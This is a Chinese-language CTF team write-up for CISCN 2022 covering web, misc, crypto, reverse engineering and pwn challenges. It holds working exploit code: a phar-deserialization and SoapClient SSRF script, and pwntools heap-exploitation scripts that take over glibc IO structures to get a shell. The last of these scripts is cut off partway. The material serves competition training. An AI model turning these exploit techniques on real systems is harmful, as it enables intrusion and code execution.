---
title: BxsTeam Ciscn2022 WP
date: 2022-6-20 19:23:14
tags: [CTF,Web,Miec,Crypto,Re,Pwn]
categories: 
 - CTF
cover: https://res.cloudinary.com/sycamore/image/upload/v1682445189/Typera/2023/04/3cefa989c163e2c70c942cacb0d2b9a5.png
---

## web

### 1.welcomeToCiscn

http://192.168.166.147:58005/flag

![image-20220619093945836](https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/fdc13e831337fd37296da62226314d5c.png)

flag{61ee5435b6f59d42329ac2644d887dc2}

### 2.ezphp

WEB手用QQ就能做题，提交flag格式：flag{xxxx}，该题环境的ip为:web-模板机get_ip的ip，端口为：58003 

http://192.168.166.147:58003

打开题目就跳转到腾讯网页面,F12流量监控也没找到题目正常的返回数据,就用了Burp代理

![image-20220619194519069](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/71b04071868e94c14ab68545511866d3.png)

打开Burp看到流量发往了www.qq.com,手动修改了一下流量目的地址和请求头host

![image-20220619194841691](https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/404af43648ff7e40324818cb9d0a9580.png)

![image-20220619195032081](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/6196e0859e1cc306b89e66254f983d62.png)

可以看到这回一个提供文件上传接口的地方,访问一下`upload.php`可以得到源码,但一些字符被html编码

![image-20220619195647524](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/128a44607394d2e48e0b6fa71a7ac246.png)

到本地写html页面访问即可得到源码:

upload.php

```php
 <?php
highlight_file(__FILE__);
header("content-type:text/html;charset=utf-8");  //设置编码
error_reporting(0);
include "config.php";
ini_set("max_execution_time","5");
//flag in flag.php
if(strlen($_FILES['file']['tmp_name'])>0){
    $filetype = $_FILES['file']['type'];
    $tmp = $_FILES['file']['tmp_name'];
    $content=file_get_contents($tmp);
    if (preg_match("/<\?|php/i", $content )){
        echo "go away!!!! hacker";
        exit();
    }
    $filepath="storage/";
    
    if( $filetype=="image/gif" ){
        $random_name=substr(md5(time()), 0, 8);
        if(move_uploaded_file($tmp,$filepath.$random_name.".gif")){
            echo "上传成功:路径在: ./".$filepath.$random_name.".gif";
        }else{
            echo "上传失败";
        }
    }
    else{
        echo "invalid gif";
    }
}
function checkimg($img){
    $check=getimagesize($img);
    if (($check!=false) && ($check['mime'] == 'image/gif')){
        echo "safe image";
    }
    else{
        echo "go away hacker";
    }
}

$img=$_GET["img"];    
if (isset($img)){
    checkimg($img);
}
```

config.php

```php
<?php
highlight_file(__FILE__);
class Mysql{
    public $conn;
    public $dbhost;
    public $dbusername;
    public $dbpasswd;
    
    public function __construct()
    {
        if(isset($_POST['dbhost'])&&isset($_POST['dbusername'])&&isset($_POST['dbpasswd']))
        {
            $this->dbhost=$_POST['dbhost'];
            $this->dbusername=$_POST['dbusername'];
            $this->dbpasswd=$_POST['dbpasswd'];
        }
    }

    public function connect()
    {
        $this->conn=new mysqli($this->dbhost,$this->dbusername,$this->dbpasswd);
        if($this->conn->connect_error)
        {
            echo "Connection failed: {$this->conn->connect_error}";
            return False;
        }
        $result=$this->conn->query("select * from test");
        if(is_resource($result))
        {
            return $result->fetch_assoc();
        }
        else
        {
            return False;
        }
    }

    public function __destruct()
    {
        $this->conn->close();
    }
}


```

这里提示了flag.php访问一下可以直接得到源码:

```php
<?php
if ($_SERVER['REMOTE_ADDR'] == "127.0.0.1"){
    file_put_contents("flag.txt",$flag);
} 
```

分析:

1. upload.php
   1. 文件类型为`image/gif`且不被正则`"/<\?|php/i"`匹配到的时候会将文件上上传到`storage/xxxxxxxx.gif`
   2. 如果有img参数的时候会使用`getimagesize`函数获取图片信息
2. config.php
   1. 只有一个类:Mysql
   2. 它的connect函数不可用,能利用的函数只有`__destruct`,在它里面调用了关闭连接的函数`$this->conn->close();`
3. flag.php
   1. 这里会将flag复制到flag.txt中,但是必须本地访问才行

解题思路:

1. 首先明确最后目标:实现`127.0.0.1`访问`flag.php`
2. 文件内容正则匹配php并且有`getimagesize`函数就很自然想到phar反序列化
3. 反序列化什么类呢?这里给了`Mysql`类,就从它入手,结合最终目的`SSRF`想到原生类利用中的`SoapClient`,销毁函数会调用`conn`成员的`close`函数,就满足`SoapClient`的`__call`函数执行条件

最终得到解题步骤:

1. 构造一个Mysql对象,让它的`conn`成员访问`http://127.0.0.1/flag.php`的`SoapClient`对象
2. 将得到的对象放入Phar文件的`Metadata`数据段
3. 为了绕过正则过滤,将原始的phar压缩为`.tar.gz`

构造实现脚本:

```php
<?php
class Mysql
{
    public $conn;
    public $dbhost;
    public $dbusername;
    public $dbpasswd;

    public function __construct($conn, $dbhost, $dbusername, $dbpasswd)
    {
        $this->conn = $conn;
        $this->dbhost = $dbhost;
        $this->dbusername = $dbusername;
        $this->dbpasswd = $dbpasswd;
    }
    public function __destory(){
        @system("calc");
        $this->conn->clase();
    }
}

$soap = new SoapClient(null,array("location"=>"http://127.0.0.1/flag.php","uri"=>"http://127.0.0.1/flag.php"));
$mysql=new Mysql(
    $soap,
    "xxx",
    "xxx",
    "xxx",
);


$ser=$mysql;
@unlink("phar.gif");
$phar = new Phar("phar.phar");
$phar = $phar->convertToExecutable(Phar::TAR,Phar::GZ);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($ser);
$phar->addFromString("f1ag.txt","f1ag{PharData}");
$phar->stopBuffering();
@system("move phar.phar.tar.gz phar.gif");
@system("ls|findstr phar");
include("phar://./phar.gif/f1ag.txt");

```

运行上面脚本可以获得`phar.gif`并且输出里面的数据,然后可以看到生成的phar.gif并没有正则匹配的数据段

再写一个form表单向题目上传文件:

```html
<html lang="en">
<body>
<form action="http://192.168.166.147:58003/upload.php" name="name" method="post" enctype="multipart/form-data" target="">
    file:<input type="file" name="file">
    <br>
    <input type="submit" value="提交">
</form>
</body>
</html>
```

![image-20220619202551241](https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/928bc6b5a4b37ece34945ec48f050563.png)

上传文件后自动跳转到题目的`/upload.php`下面,得到文件上传地址

![image-20220619202710848](https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/8604d2a808d2a95033b7e47354f02a32.png)

然后使用phar协议加载这个文件地址即可触发反序列化

http://192.168.166.147:58003/upload.php?img=phar://./storage/ae08a63f.gif

![image-20220619203123372](https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/857640a3f076370e147a02fa7830303b.png)

最终会因为反序列化调用`SoapClient`访问/flag.php而将flag写入flag.txt,但是因为我们的文件格式并不是gif所以并不会满足if条件而输出`go away hacker`但是问题不大,此时去访问flag.txt即可得到flag

http://192.168.166.147:58003/flag.txt

![image-20220619203336153](https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/111191a5c9016190e8b5bcab43d52be6.png)

## 

## MISC

### pika
`flag`：flag{d6246d1f41fad032ee30193f3af15408}
lsb隐写，RGB0通道有异常，导出为一个txt文件。
内容如下：
> cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==

base64解密，得到：
> pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu 

pikalang解密网站：https://www.dcode.fr/pikalang-language
解密得flag
### 内存中的secret
拿到两个文件，`secret.raw`和 `yuijm0-=pkl;`

用 volatility 扫描`secret.raw`：`volatility -f secret.raw imageinfo`，得到：
> Suggested Profile(s) : Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393

是一个内存镜像文件，同时获得内存的操作系统类型及版本

使用 AXIOM 分析内存镜像文件，镜像配置文件直接选择 `Win10x64_14393`：
![image-20230426015056726](https://res.cloudinary.com/sycamore/image/upload/v1682445061/Typera/2023/04/e34c8c2bc8f3779902c6fc3ef8d6d26f.png)



AXIOM 分析完毕后，先好好地翻一翻，看看都有啥。
使用痕迹 --> 操作系统 --> Windows 时间线活动，能找到不少 VeraCrypt 的运行痕迹：
![image-20230426015040521](https://res.cloudinary.com/sycamore/image/upload/v1682445044/Typera/2023/04/3c5e8d2335b4749ed416a8374458b0d1.png)

使用痕迹 --> web 相关，对日期做降序排序之后，能看到不少文件记录，
值得注意的有：几个虚拟磁盘文件，很可疑的flag.txt.txt，BitLocker 恢复密钥，decrypt.png，secret.zip
![image-20230426015035954](https://res.cloudinary.com/sycamore/image/upload/v1682445040/Typera/2023/04/858e96afc434419d85425864be03a11b.png)
使用痕迹 --> 加密，能看到5个 BitLocker 恢复密钥文件，其中四个恢复密钥部分内容完整，且包含有三个不同的恢复密钥，如下：
`109703-115929-085558-382888-715638-661716-466774-220858`
`172612-531773-032945-133364-584639-681373-481602-511291`
`109703-115929-085558-382888-715638-661716-466774-233200`

结合 VeraCrypt 的运行痕迹，猜测`yuijm0-=pkl;`应该是一个磁盘文件，大概需要使用 VeraCrypt 进行挂载，
web 相关中得到的几个可以文件，应该与挂载之后的步骤有关联，
几个 BitLocker 恢复密钥，应该是需要我们使用恢复密钥，解开后面得到的某个文件。

结合所给的提示：键盘密码，发现该文件的文件名很有特点，其轨迹如下：
![image-20230426015029743](https://res.cloudinary.com/sycamore/image/upload/v1682445035/Typera/2023/04/e5efed00ab6006e2ec2efbfeb24d0dbf.png)

可以看出，应该是 TZ，推测挂载需使用的密码应该就是这个。
成功将磁盘文件挂载到本地后，得到一个虚拟磁盘文件：`encrypt.vhd`

打开 DiskGenius，磁盘 --> 打开虚拟磁盘文件，选择上一步得到的文件，
是使用 BitLocker 加密的：
![image-20230426015024693](https://res.cloudinary.com/sycamore/image/upload/v1682445028/Typera/2023/04/f84d4415570a55914af21382e4c88d08.png)

依次尝试之前获得的三个恢复密钥，可以成功解开，获得 `decrypt.png`和`secret.zip`：
![image-20230426015019970](https://res.cloudinary.com/sycamore/image/upload/v1682445027/Typera/2023/04/6a6c5ab814e6d331f41a18998a8a6ff8.png)

其中，`secret.zip`被加密，结合文件名推测`decrypt,png`应该包含密码。
![image-20230426015015401](https://res.cloudinary.com/sycamore/image/upload/v1682445026/Typera/2023/04/70720bc6a39d9eab22e5f340a1829e4c.png)

文字提示：致敬 babydisk，可以联想到初赛的那道题，查看 wp 后获得关键词**螺旋**。
尝试后得到密码为：从右上角开始，按顺时针旋转的顺序列出偏旁：`⼃⼇⼋⼏⼎⼍⼌⼈⼄⼀⼁⼂⼆⼊⼉⼅`
直接复制维基的 Unicode，使用7z解才成功
（必须注意字符的问题，手打出来的偏旁，可能因为输入法的原因，无论如何也解不出来）

解得 flag.txt 内容如下：
![image-20230426015010492](https://res.cloudinary.com/sycamore/image/upload/v1682445014/Typera/2023/04/3a481abbd31dbb4dba5468a45f209de5.png)

用脚本解密：
```python
import base64

def base64stego_decrypt(lines):
    base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"     
    bintext = ""
    for line in lines:
        if line.find("==") > 0:
            tmp = bin(base64char.find(line[-3]) & 15)[2:]
            bintext = bintext+"0"*(4-len(tmp))+tmp
        elif line.find("=") > 0:
            tmp = bin(base64char.find(line[-2]) & 3)[2:]
            bintext = bintext+"0"*(2-len(tmp))+tmp
    text = ""
    if(len(bintext) % 8 != 0):
        print("error")
        for i in range(0, len(bintext), 8):
            if(i+8 > len(bintext)):
                text = text+"-"+bintext[i:]
                return text
            else:
                text = text+chr(int(bintext[i:i+8], 2))
    else:
        for i in range(0, len(bintext), 8):
            text = text+chr(int(bintext[i:i+8], 2))
        return text

if __name__ == "__main__":
    path = "flag.txt"
    file = open(path, "r")
    line = file.read().splitlines()
    print(base64stego_decrypt(line))
```
得到 flag：`MemoRy_S1cr1t`

## CRYPTO
### eazy
`flag`: flag{a9462922e5da8ef93d213c33168881c5}

打开后得到base64，解密得到：
svciqytf10r3ln!nule7
W形栅栏解密，栏数为3，得到：
syntvfu1c0lri3elqn7!
凯撒直接遍历，
```python
model = "abcdefghijklmnopqrstuvwxyz"
model2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

str1 = "syntvfu1c0lri3elqn7!"

for key in range(1,27):
    for s in str1:
        if s.islower():
            n = model.find(s)
            s = model[n-key]
        elif s.isupper():
            n = model2.find(s)
            s = model2[n-key]
        print(s, end='')
    print('')
```
得到：
flagish1p0yev3ryda7!，
就是：flag is h1p0yev3ryda7!
然后 h1p0yev3ryda7! 进行md5 32(小写) 加密，得到flag

### RunFaster
`flag`: flag{0ed7bc5c61e32c10e082abd2b5589a22}

下载题目后查看ciphertext.txt，发下里面是整齐的16进制串，题目无其他提示，转成字符后无实意。不过之前比赛遇到过类似的题目，是OTP一次密码，这样确实也符合题目RunFaster，参考[Many-Time-Pad 攻击](https://www.ruanx.net/many-time-pad/)，修改脚本逆求key。

MTP脚本如下

```python
import Crypto.Util.strxor as xo
import libnum, codecs, numpy as np

def isChr(x):
    if ord('a') <= x and x <= ord('z'): return True
    if ord('A') <= x and x <= ord('Z'): return True
    return False

def infer(index, pos):
    if msg[index, pos] != 0:
        return
    msg[index, pos] = ord(' ')
    for x in range(len(c)):
        if x != index:
            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(' ')

dat = []

def getSpace():
    for index, x in enumerate(c):
        res = [xo.strxor(x, y) for y in c if x!=y]
        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))
        cnt = [f(pos) for pos in range(len(x))]
        for pos in range(len(x)):
            dat.append((f(pos), index, pos))

c = [codecs.decode(x.strip().encode(), 'hex') for x in open('Problem.txt', 'r').readlines()]

msg = np.zeros([len(c), len(c[0])], dtype=int)

getSpace()

dat = sorted(dat)[::-1]
for w, index, pos in dat:
    infer(index, pos)

print('\n'.join([''.join([chr(c) for c in x]) for x in msg]))
```

得到对应输出

![](https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/fe48ad2860db212c649751149211d71d.png)

可见能看到明文信息，从最后一串下手，可以猜出是 e  were neither up nor down. OK ，根据明文与密文异或求出key。

```python
s=bytes.fromhex('32397f47102d3c101b3a2a34063a2013354111173036600a0c44314c602d32')
txt="e  were neither up nor down. OK"
for i in range(len(s)):
    print(chr(ord(txt[i])^s[i]),end='')
#W_0u_Y0u_C@n_R3@11y_D@nc3_b@by
print()
print(chr(int('25',16)^ord('e')))
#W@_0u_Y0u_C@n_R3@11y_D@nc3_b@by
```

还有一位没有还原，可以结合第一句话是倒数第四句话they来推测，拿到正确的key，之后key与所有密文异或。

![image-20220619211840330](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/ff1f317976f4a27903d448b1ab4c8a29.png)

还原出的key作为压缩包解密，第二关给了一个字典和一个加salt的hash，hash无法逆求所以只能是爆破将字典的字符按照对应的salt依次爆破。

```python
from passlib.hash import md5_crypt
f=open(r'C:\Users\lx\Desktop\分区赛\密码\minirockyou.txt','r')
enc='$1$ciscn010$mSuTlV75nZZGGjoayF/nS0'
while True:
    s=f.readline().replace('\n','')
    if enc in md5_crypt.hash(s,salt='ciscn010'):
        print(s)
        break
```

因为密码数据比较短，所以依次手动修改enc和salt即可，最终得到一串明文字符。

```python
m="the second letter of each word in this list in order" #取出这些单词的第二个字符
m=m.split(' ')
str=''
for i in range(len(m)):
    str+=m[i][1]
print(str)
#heefaonhinr
#flag{0ed7bc5c61e32c10e082abd2b5589a22}
```

直接将得到的字符包上flag提交不对，长度不对，其余flag的内容均为32位16进制，所以尝试flag{md5(heefaonhinr)}，: ) 提交正确。

## RE

### crackme2

`flag`: flag{50c418de67942e713517e900dbd12183}

android逆向，jadx打开，查看main1Activity，其中主要函数如下
```java
    public native String stringFromJNI(String str);

    static {
        System.loadLibrary("crackme2");
    }

    public static boolean checkFmt(String input) {
        for (int i = 0; i < input.length(); i++) {
            if (Character.isUpperCase(input.charAt(i))) {
                return false;
            }
        }
        return true;
    }


    public /* synthetic */ void m0lambda$onCreate$0$comctfcrackme2Main1Activity(EditText et_input, View v) {
        String input = et_input.getText().toString();
        if (input.startsWith("flag{") && input.endsWith("}") && input.length() > 6 && input.length() < 39 && checkFmt(input)) {
            Toast.makeText(this, stringFromJNI(input.substring(5, input.length() - 1)), 0).show();
        }
    }
```
首先check了flag的格式和长度，checkFmt用于确定输入无大写，之后调用了stringFromJNI即native层函数,故主要逻辑在so文件，先解压apk，ida加载x86的so文件，首先查看导出表，发现该函数是静态注册的，修改一下参数如下。


![image-20220619201210787](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/35f672f500d43444bd5231a0a8c258b7.png)

首先判断传入内容是否为32位，之后跟进sub_D1FE5640函数对flag的内容进行check。

![image-20220619201406417](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/106131f536b262650aa3b590534a0514.png)

这一步是读取序列化文件tmp，用于之后加密使用,紧接着通过sscanf将输入两个一组转为16进制存入一个数组，32为输入为仅为16进制的字符。

![image-20220619201917396](https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/04108af78a95bd369ca3ba2f1a87376d.png)

之后是调用了`com/risid/test/AESEncrypt`对象中的encrypt方法，并且通过`SetByteArrayRegion`函数实现JNI向java层传参数，jadx中可以找到encrypt方法的定义。

![image-20220619202135278](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/cbb3b62057a98ec580c35b63d77d89f9.png)

JNI传给该函数的参数content是sscanf后存入的数组，iv则是"0123456789abcdef"，第三个参数则是从tmp中解析的对象，可见上述操作主要实现了AES的CBC加密，主要解密密文的前16个字节，已经拿到了iv还缺少key。

![image-20220619203245330](https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/2cb8a1e069fa00e3c92f1926f902ca6e.png)

key可以在`com/risid/test`包中的`AESGenerator`类中找到，用python尝试解密即可。

```python
from Crypto.Cipher import AES
c=bytes([0x08, 0x32, 0x97, 0x4C, 0x9E, 0xE2, 0xDB, 0x44, 0x40, 0x92, 0x0B, 0x0F, 0x7C, 0x75, 0x00, 0x56, 0x7C, 0x13, 0xA3, 0xBF, 0xB4, 0x69, 0x5D, 0x88, 0xCE, 0x0B, 0x97, 0x78, 0x51, 0x05, 0x8A, 0xD9])
iv=b'0123456789abcdef'
key=bytes.fromhex('60aef077a3624ff7725b77dae4c6e004')
aes=AES.new(key,AES.MODE_CBC,iv)
m=aes.decrypt(c)
for i in range(16):
    print(hex(m[i])[2:].zfill(2),end='')
#flag{50c418de67942e713517e900dbd12183}
```

### easycry

re签到题，exeinfo查壳，64位无壳elf文件，ida64载入。

`flag`：flag{061cc4091400c082234a57034ed05cf2}

![image-20220619204320327](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/c61d07c934a61164fc0d92c28ff9d3ad.png)

findcrypt插件搜索，发现AES的sbox，并且main函数逻辑比较清晰。

![image-20220619204531962](https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/f8cec6059657af8083a6574724aef7e0.png)

v5是AES秘钥，ptr是扩展秘钥，秘钥是32位，sub_1DC5是秘钥扩展，sub_2181则是分两个16字节进行加密，AES ECB模式，直接解密即可拿到flag。

```python
from Crypto.Cipher import AES
k=bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F])
aes=AES.new(k,AES.MODE_ECB)
c=bytes([0x32, 0x59, 0x1D, 0xED, 0xBA, 0xAC, 0x5D, 0x48, 0xCE, 0x1E, 0xBD, 0x8C, 0x43, 0xFA, 0x34, 0x5B, 0x9D, 0x6E, 0xBB, 0x25, 0xF9, 0x17, 0x59, 0x31, 0xDE, 0x20, 0x36, 0xB9, 0x5B, 0xB5, 0x72, 0x5B])
print(aes.decrypt(c))
#flag{061cc4091400c082234a57034ed05cf2}
```


## PWN
### duck

![image-20220619194732802](https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/b330caffb4d582c144c2e06d22eb3057.png)

**flag{693edf4763ef4cdd4f152794028b7f5e}**

libc 2.34 下的 pwn 题，给的漏洞比较基础就是 **UAF**，同时给了 Edit 功能，我们可以很简单的 getshell。

**思路**

1. 利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc
2. 分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块
3. 修改掉 stderr 的 flag 为 `/bin/sh\0`
4. 修改掉 `_IO_file_jumps` 里的函数指针为 `system` ，最后改掉 Top Chunk 的 size 进入 `_IO_fflush` 触发 getshell。

**Exp**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
# p = process('./pwn')
# debug()
p = remote('192.168.166.147',58013)

def menu(c):
    sla('Choice: ',str(c))

def add():
    menu(1)

def dele(id):
    menu(2)
    sla('Idx: ',str(id))

def show(id):
    menu(3)
    sla('Idx: \n',str(id))

def edit(id,data,size=0x100):
    menu(4)
    sla('Idx: ',str(id))
    sla('Size: ',str(size))
    sea('Content: ',str(data))


add()
dele(0)
show(0)
heap_leak = uu64(ru('\n'))
heap_base = heap_leak <<12
lg('heap_leak',heap_leak)
lg('heap_base',heap_base)

for i in range(10):
    add() # 9

for i in range(1,2+8):
    dele(i)
show(8)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1f2cc0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()

stderr = libc_base + 0x1f3680
helper = libc_base + 0x1f45c0

edit(7,p64(heap_leak^(heap_base+0x100)))
add() # 11
# pause()
add() # 12
edit(12,p64(stderr)*2)
lg('ADDR',(heap_base+0x100))
add() # 13
edit(13,'/bin/sh\0')
edit(12,p64(helper)*2)
add()
edit(14,p64(system_addr))
for i in range(3):
    edit(12,p64(heap_base+0xd30)*2)
    add()
    edit(15,p64(0)*2)

add()
add()
add()

# add()

p.interactive()
```

### bigduck

![image-20220619194814107](https://res.cloudinary.com/sycamore/image/upload/v1682444987/Typera/2023/04/fd8d10ea967cd9e8e58b8c6e824fdcd2.png)

**flag{afae47ead2452a4b5ba629ec88635a51}**

libc 2.33 下开了沙盒的堆题，其他部分和上题一样。

**思路**

1. 利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc
2. 分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块
3. House of kiwi 完成栈迁移，执行 shellcode 读取 flag 

**exp**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
# p = process('./pwn')
# debug()
p = remote('192.168.166.147',58011)

def menu(c):
    sla('Choice: ',str(c))

def add():
    menu(1)

def dele(id):
    menu(2)
    sla('Idx: ',str(id))

def show(id):
    menu(3)
    sla('Idx: \n',str(id))

def edit(id,data,size=0x100):
    menu(4)
    sla('Idx: ',str(id))
    sla('Size: ',str(size))
    sea('Content: ',str(data))


